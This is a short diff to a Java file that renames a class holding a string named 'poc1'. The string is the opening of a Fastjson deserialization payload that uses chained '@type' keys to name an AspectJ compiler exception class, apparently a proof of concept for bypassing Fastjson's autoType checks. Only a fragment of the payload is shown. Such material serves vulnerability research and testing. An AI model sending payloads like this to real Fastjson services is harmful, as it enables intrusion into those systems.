@@ -1,6 +1,6 @@
 import com.alibaba.fastjson.JSON;
 
-public class source1280 {
+public class aspectj {
     private static String poc1 = "{\n" +
             "    \"@type\":\"java.lang.Exception\",\n" +
             "    \"@type\":\"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\"\n" +
